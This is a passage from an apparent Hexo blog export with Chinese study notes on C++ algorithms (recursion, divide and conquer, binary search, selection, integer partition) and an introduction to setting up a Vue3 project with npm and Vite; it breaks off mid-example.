href="https://baike.baidu.com/item/斐波那契数列/99145">斐波那契数列_百度百科 (baidu.com)</a></p><p>对于斐波那契数列，可以按题意直接递归，也可以将递归结果存起来，进行递推。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归算法</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fibonacci_back</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">fibonacci_back</span>(n - <span class="number">1</span>) + <span class="built_in">fibonacci_back</span>(n - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递推算法</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fibonacci_front</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> f[<span class="number">2</span>] = &#123; <span class="number">1</span>, <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">2</span>) <span class="keyword">return</span> f[n];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> temp = f[<span class="number">0</span>] + f[<span class="number">1</span>];</span><br><span class="line">f[<span class="number">0</span>] = f[<span class="number">1</span>];</span><br><span class="line">f[<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> f[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;递归&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;：&quot;</span> &lt;&lt; <span class="built_in">fibonacci_back</span>(i) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;递推&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;：&quot;</span> &lt;&lt; <span class="built_in">fibonacci_front</span>(i) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-集合全排列问题"><a href="#1-2-集合全排列问题" class="headerlink" title="1.2 集合全排列问题"></a>1.2 集合全排列问题</h4><blockquote><p>对集合的元素进行排列。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 产生元素k到m的全排列，作为前k到1个元素的后缀</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Perm</span><span class="params">(<span class="type">int</span> list[], <span class="type">int</span> k, <span class="type">int</span> m, <span class="type">int</span>&amp; res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 构成一次全排列输出结果</span></span><br><span class="line"><span class="keyword">if</span> (k == m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= m; i++)</span><br><span class="line">cout &lt;&lt; list[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">res++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 在数组list中，产生元素k到m的全排列</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = k; j &lt;= m; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">swap</span>(list[k], list[j]);</span><br><span class="line"><span class="built_in">Perm</span>(list, k + <span class="number">1</span>, m, res);</span><br><span class="line"><span class="built_in">swap</span>(list[k], list[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> list[len];</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">list[i] = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Perm</span>(list, <span class="number">0</span>, <span class="number">3</span>, res);</span><br><span class="line">    <span class="comment">// 输出排列的个数</span></span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3-整数划分问题"><a href="#1-3-整数划分问题" class="headerlink" title="1.3 整数划分问题"></a>1.3 整数划分问题</h4><blockquote><p>把一个正整数划分成任意个整数相加。记正整数n，m是它的划分，所以可以有如下情况：</p><ol><li><code>f(1, m) = 1, m &gt;= 1</code>：无论m为几，n只能分成1</li><li><code>f(n, 1) = 1, n &gt;= 1</code>：无论n为几，只有一种划分，就是n个1</li><li><code>f(n, m) = f(n, n), m &gt;= n</code>：m比n大时，n也分不出m，所以可以化简成m = n</li><li><code>f(n, n) = 1 + f(n, n - 1)</code>：当二者相等时，可以向下划分，例如6=5+1，5=1+4等</li><li><code>f(n, m) = f(n, m - 1) + f(n - m, m )，n &gt; m &gt; 1</code>：由此划分成两数之和后继续划分。例如：<code>f(6,4) = f(6,3) + f(2, 4)</code>，意思是6=4+2，然后4和2可以递归向下分。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">split</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">1</span> || m == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; m) <span class="keyword">return</span> <span class="built_in">split</span>(n, n);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n == m) <span class="keyword">return</span> <span class="built_in">split</span>(n, n - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">split</span>(n, m - <span class="number">1</span>) + <span class="built_in">split</span>(n - m, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-分治"><a href="#2-分治" class="headerlink" title="2 分治"></a>2 分治</h3><h4 id="2-1-分治基础"><a href="#2-1-分治基础" class="headerlink" title="2.1 分治基础"></a>2.1 分治基础</h4><blockquote><p>分治步骤：</p><ul><li>分解：将问题分解成若干个与原问题形式相同的相互独立的子问题。</li><li>解决：直接解决容易解决的小问题，否则递归地解决各个子问题。</li><li>合并：将各个子问题的解合并为原问题的解。</li></ul><p>适用场景：</p><ul><li>问题可以被分解，且各个子问题是独立的。</li><li>问题缩小到一定程度可以被容易解决</li><li>子问题的解可以合并为该问题的解。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设计伪代码</span></span><br><span class="line"><span class="built_in">Divide_and_Conquer</span>(P)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( |P| &lt;= n0 ) <span class="keyword">return</span> <span class="built_in">adhoc</span>(P);</span><br><span class="line">    <span class="comment">// divide P into smaller substances P1,P2, ... ,Pk;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= k;k++)</span><br><span class="line">        yi = <span class="built_in">Divide_and_Conquer</span>(Pi); <span class="comment">// 递归解决Pi问题</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">merge</span>(y1,y2, ... , yk); <span class="comment">// 合并子问题</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-二分查找"><a href="#2-2-二分查找" class="headerlink" title="2.2 二分查找"></a>2.2 二分查找</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// n是数组长度</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> Type&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinarySearch</span><span class="params">(Type arr[], <span class="type">const</span> Type&amp; res, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> lp = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> rp = len - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (lp &lt;= rp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> mid = (lp + rp) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (res == arr[mid]) <span class="keyword">return</span> mid;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (res &gt; arr[mid]) lp = mid + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> rp = mid - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-循环赛日程表"><a href="#2-3-循环赛日程表" class="headerlink" title="*2.3 循环赛日程表"></a>*2.3 循环赛日程表</h4><blockquote><p>设有n个选手进行循环比赛,其中<code>n = pow(2,k)</code>，要求每名选手要与其他n-1名选手都赛一次，每名选手每天比赛一次，循环赛共进行n-1天，要求每天没有选手轮空。</p><p>输入：k</p><p>输出：表格形式的比赛安排表</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> len = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Solution</span>() &#123;</span><br><span class="line">arr.<span class="built_in">resize</span>(len, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">arr[i].<span class="built_in">resize</span>(len);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Copy</span><span class="params">(<span class="type">int</span> tox, <span class="type">int</span> toy, <span class="type">int</span> fromx, <span class="type">int</span> fromy, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; r; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; r; j++) &#123;</span><br><span class="line">arr[tox + i][toy + j] = arr[fromx + i][fromy + j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Table</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, r;</span><br><span class="line"><span class="type">int</span> n = <span class="number">1</span> &lt;&lt; k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">arr[<span class="number">0</span>][i] = i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (r = <span class="number">1</span>; r &lt; n; r &lt;&lt;= <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span> * r) &#123;</span><br><span class="line"><span class="built_in">Copy</span>(r, r + i, <span class="number">0</span>, i, r);</span><br><span class="line"><span class="built_in">Copy</span>(r, i, <span class="number">0</span>, r + i, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">cout &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="2-4-棋盘覆盖问题"><a href="#2-4-棋盘覆盖问题" class="headerlink" title="*2.4 棋盘覆盖问题"></a>*2.4 棋盘覆盖问题</h4><h4 id="2-5-选择问题"><a href="#2-5-选择问题" class="headerlink" title="*2.5 选择问题"></a>*2.5 选择问题</h4><blockquote><p>在数组中找到第k小的元素。</p><p>思路：快速排序。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Solution</span>(vector&lt;<span class="type">int</span>&gt; arr) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;arr = arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">select</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 找到了第k小的元素</span></span><br><span class="line"><span class="keyword">if</span> (left &gt;= right) <span class="keyword">return</span> arr[left];</span><br><span class="line"><span class="type">int</span> lp = left;</span><br><span class="line"><span class="type">int</span> rp = right + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 把最左边的元素作为分界数据</span></span><br><span class="line"><span class="type">int</span> p = arr[lp];</span><br><span class="line"><span class="comment">// 把左侧&gt;=p的元素和右侧&lt;=p的元素交换</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 左侧&gt;=p的元素</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">lp++;</span><br><span class="line">&#125; <span class="keyword">while</span> (arr[lp] &lt; p);</span><br><span class="line"><span class="comment">// 右侧&lt;=p的元素</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">rp--;</span><br><span class="line">&#125; <span class="keyword">while</span> (arr[rp] &gt; p);</span><br><span class="line"><span class="keyword">if</span> (lp &gt;= rp) <span class="keyword">break</span>; <span class="comment">// 没有发现交换对象</span></span><br><span class="line"><span class="built_in">swap</span>(arr[lp], arr[rp]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 快速排序算法描述中的nleft = rp - left</span></span><br><span class="line"><span class="keyword">if</span> (rp - left + <span class="number">1</span> == k) <span class="keyword">return</span> p;</span><br><span class="line">arr[left] = arr[rp]; <span class="comment">// 把p与arr[rp]交换</span></span><br><span class="line">arr[rp] = p; <span class="comment">// 结点rp处划分左右子集</span></span><br><span class="line"><span class="keyword">if</span> (rp - left + <span class="number">1</span> &lt; k) <span class="keyword">return</span> <span class="built_in">select</span>(rp + <span class="number">1</span>, right, k - (rp - left + <span class="number">1</span>)); <span class="comment">// 在右子集中查找</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">select</span>(left, rp - <span class="number">1</span>, k); <span class="comment">// 在左子集中查找</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="2-6-输油管道问题"><a href="#2-6-输油管道问题" class="headerlink" title="*2.6 输油管道问题"></a>*2.6 输油管道问题</h4><h4 id="2-7-半数集问题"><a href="#2-7-半数集问题" class="headerlink" title="2.7 半数集问题"></a>2.7 半数集问题</h4><blockquote><p>给定一个自然数n给定一个自然数n，由n开始可以依次产生半数集set(n)中的数如下：</p><ol><li>n ∈ set(n)；</li><li>在n 的左边加上一个自然数，但该自然数不能超过最近添加的数的一半；</li><li>按此规则进行处理，直到不能再添加自然数为止。</li></ol><p>例如，set(6) = {6,16,26,126,36,136}。半数集set(6)中有6 个元素。</p><p>注意半数集是多重集。</p><p>对于给定的自然数n，计算半数集set(n)中的元素个数。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Solution</span>() : <span class="built_in">temp</span>(<span class="number">1000</span>, <span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="comment">// 普通分治</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">comp</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n / <span class="number">2</span>; i++)</span><br><span class="line">res += <span class="built_in">comp</span>(i);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记忆化，添加数组保存结果，防止重复搜索</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MemoryComp</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (temp[n] &gt; <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n / <span class="number">2</span>; i++)</span><br><span class="line">res += <span class="built_in">comp</span>(i);</span><br><span class="line">temp[n] = res;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="2-8-整数因子分解"><a href="#2-8-整数因子分解" class="headerlink" title="2.8 整数因子分解"></a>2.8 整数因子分解</h4><blockquote><p>大于1的正整数n可以分解成：<code>n=x1 * x2 * ... * xm</code></p><p>例如12可以分成：12=12、12=6 x 2、12=3 x 4、12=3 x 2 x 2共4种。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>&amp; res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">1</span>) res++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">if</span> (n % i == <span class="number">0</span>) <span class="built_in">slove</span>(n / i, res);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="三、动态规划"><a href="#三、动态规划" class="headerlink" title="三、动态规划"></a>三、动态规划</h2><h3 id="1-动态规划基础"><a href="#1-动态规划基础" class="headerlink" title="*1 动态规划基础"></a>*1 动态规划基础</h3><h3 id="2-矩阵连乘积问题"><a href="#2-矩阵连乘积问题" class="headerlink" title="*2 矩阵连乘积问题"></a>*2 矩阵连乘积问题</h3><hr><h2 id="四、贪心算法"><a href="#四、贪心算法" class="headerlink" title="四、贪心算法"></a>四、贪心算法</h2><hr><h2 id="五、回溯算法"><a href="#五、回溯算法" class="headerlink" title="五、回溯算法"></a>五、回溯算法</h2><hr><h2 id="六、分支限界算法"><a href="#六、分支限界算法" class="headerlink" title="六、分支限界算法"></a>六、分支限界算法</h2><hr><h2 id="七、图的搜索算法"><a href="#七、图的搜索算法" class="headerlink" title="七、图的搜索算法"></a>七、图的搜索算法</h2><hr><h2 id="八、图论"><a href="#八、图论" class="headerlink" title="八、图论"></a>八、图论</h2><hr><h2 id="九、数论"><a href="#九、数论" class="headerlink" title="九、数论"></a>九、数论</h2><hr><h2 id="十、组合数学"><a href="#十、组合数学" class="headerlink" title="十、组合数学"></a>十、组合数学</h2>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> C++ </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue</title>
      <link href="/posts/f8e09374.html"/>
      <url>/posts/f8e09374.html</url>
      
        <content type="html"><![CDATA[<h1 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h1><blockquote><p><a href="https://cn.vuejs.org/guide/introduction.html">official::Vue.js</a></p><p><a href=".\cc1b9611">text::Javascript</a></p></blockquote><hr><h2 id="一、Vue前置知识"><a href="#一、Vue前置知识" class="headerlink" title="一、Vue前置知识"></a>一、Vue前置知识</h2><h3 id="1-命令"><a href="#1-命令" class="headerlink" title="1 命令"></a>1 命令</h3><blockquote><p>在使用命令前先要安装Node.js</p><p><a href=".\Log\dd9c034b">text::Node.js安装</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建Vue工程</span></span><br><span class="line">npm init vue@latest</span><br><span class="line">Project name &gt;&gt; <span class="comment"># 不要存在大写</span></span><br><span class="line">Add TypeScript? <span class="comment"># Ts扩展，回车默认No</span></span><br><span class="line">Add JSX Support? <span class="comment"># JSX支持，回车默认No</span></span><br><span class="line">Add Vue Router <span class="keyword">for</span> Single Page Application development? <span class="comment"># 路由，回车默认No</span></span><br><span class="line">Add Pinia <span class="keyword">for</span> state management? <span class="comment"># 状态管理，回车默认No</span></span><br><span class="line">Add Vitest <span class="keyword">for</span> Unit testing? <span class="comment"># 单元测试，回车默认No</span></span><br><span class="line">Add an End-to-End Testing Solution? <span class="comment">#</span></span><br><span class="line">Add ESLint <span class="keyword">for</span> code quality? <span class="comment">#</span></span><br><span class="line">Add Prettier <span class="keyword">for</span> code formatting? <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">npm install</span><br><span class="line">cnpm install <span class="comment"># npm的镜像，更快</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><h3 id="2-目录结构"><a href="#2-目录结构" class="headerlink" title="2 目录结构"></a>2 目录结构</h3><blockquote><p>.vscode：vscode工具的配置文件</p><p>node_modules：Vue项目的运行依赖文件（npm install安装后生成的文件夹）</p><p>public：资源文件夹（浏览器图标)</p><p>src：源码文件夹</p><p>.gitignore：git忽略文件</p><p>index.html：入口HTML文件。所有文件都在这个html中运行。</p><p>package.json：信息描述文件</p><p>README.md：注释文件</p><p>vite.config.js： Vue配置文件</p><p>注：</p><ul><li>一般情况下public放动态资源，src/assets中放静态资源。public可以是放服务器动态请求的资源，而assets是放前端必须要的资源。因为assets中的东西在build以后就编译到程序中，无法进行修改。</li></ul></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/favicon.ico&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vite App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--下面两行不要修改--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vue3_cli_default&quot;</span><span class="punctuation">,</span> <span class="comment">// 项目名</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0&quot;</span><span class="punctuation">,</span> <span class="comment">// 项目版本</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;serve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.8&quot;</span> <span class="comment">// vue 版本</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="comment">// 详细依赖环境</span></span><br><span class="line">    <span class="attr">&quot;@vitejs/plugin-vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@vue/compiler-sfc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vite&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.5.2&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> vue <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://vitejs.dev/config/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">vue</span>()]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3-API风格"><a href="#3-API风格" class="headerlink" title="3 API风格"></a>3 API风格</h3><blockquote><p>选项式API：Vue2写法。在组合式API的基础上实现。常用于项目中部分代码用Vue写。特点是在<code>&lt;script&gt;</code>中分别完善对应的功能后再选择，例如：<code>data()</code>、<code>methods</code>等。</p><p>组合式API：Vue3写法。常用于整个项目都用Vue写。特点是可以将功能整合起来。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">// 选项式API</span><br><span class="line">export default &#123;</span><br><span class="line">  // data() 返回的属性将会成为响应式的状态</span><br><span class="line">  // 并且暴露在 this 上</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span 